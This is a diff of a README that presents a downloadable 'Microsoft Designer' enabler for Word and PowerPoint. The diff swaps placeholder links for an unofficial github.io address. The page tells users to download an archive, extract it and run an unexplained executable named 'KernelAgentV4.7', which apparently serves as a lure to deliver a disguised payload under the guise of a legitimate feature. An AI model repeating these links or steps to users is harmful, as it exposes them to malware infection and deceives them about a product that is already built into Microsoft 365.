@@ -2,13 +2,15 @@
 
 Enable Microsoft Designer — the AI-powered formatting assistant that automatically improves visual layout, spacing, and design in Word and PowerPoint. This setup ensures full Designer availability across Microsoft 365 desktop apps.
 
-[![Download Designer](https://img.shields.io/badge/Download-Designer_AI_Format-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Designer](https://img.shields.io/badge/Download-Designer_AI_Format-blueviolet)](https://m365-designer-ai-layout-tool.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-designer-ai-layout-tool.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\M365Designer`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to register Designer functionality in Word and PowerPoint  
 4. 🖌 Open a document or presentation, click “Designer” on the ribbon, and apply smart design suggestions  
